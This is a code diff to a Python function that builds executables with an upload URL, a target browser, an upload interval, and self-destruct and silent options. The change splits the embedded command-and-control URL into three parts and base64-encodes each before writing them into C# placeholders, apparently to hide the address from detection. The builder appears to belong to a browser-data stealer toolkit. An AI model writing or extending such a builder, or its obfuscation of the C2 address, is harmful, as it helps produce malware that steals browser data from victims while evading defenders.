@@ -2,6 +2,7 @@
 import os
 import subprocess
 import re
+import base64
 
 def build_executable(exe_name, upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="/app/webapp/static/builds"):
     """
@@ -56,9 +57,33 @@ def build_executable(exe_name, upload_url, target_browser, upload_interval, self
         print(f"Error: Failed to read {source_file}: {str(e)}")
         return False, f"Failed to read {source_file}: {str(e)}"
 
+    # Split the URL into three unequal parts
+    url_length = len(upload_url)
+    part1_end = url_length // 4  # Roughly first 25%
+    part2_end = url_length * 3 // 4  # Next 50%
+    part1 = upload_url[:part1_end]
+    part2 = upload_url[part1_end:part2_end]
+    part3 = upload_url[part2_end:]
+    
+    # Base64 encode each part
+    part1_b64 = base64.b64encode(part1.encode('utf-8')).decode('utf-8')
+    part2_b64 = base64.b64encode(part2.encode('utf-8')).decode('utf-8')
+    part3_b64 = base64.b64encode(part3.encode('utf-8')).decode('utf-8')
+
+    # Replace the placeholder variables
     content = re.sub(
-        r'public static readonly string C2Url = "[^"]*";',
-        f'public static readonly string C2Url = "{upload_url}";',
+        r'private static readonly string C2Part1 = "[^"]*";',
+        f'private static readonly string C2Part1 = "{part1_b64}";',
+        content
+    )
+    content = re.sub(
+        r'private static readonly string C2Part2 = "[^"]*";',
+        f'private static readonly string C2Part2 = "{part2_b64}";',
+        content
+    )
+    content = re.sub(
+        r'private static readonly string C2Part3 = "[^"]*";',
+        f'private static readonly string C2Part3 = "{part3_b64}";',
         content
     )
     content = re.sub(
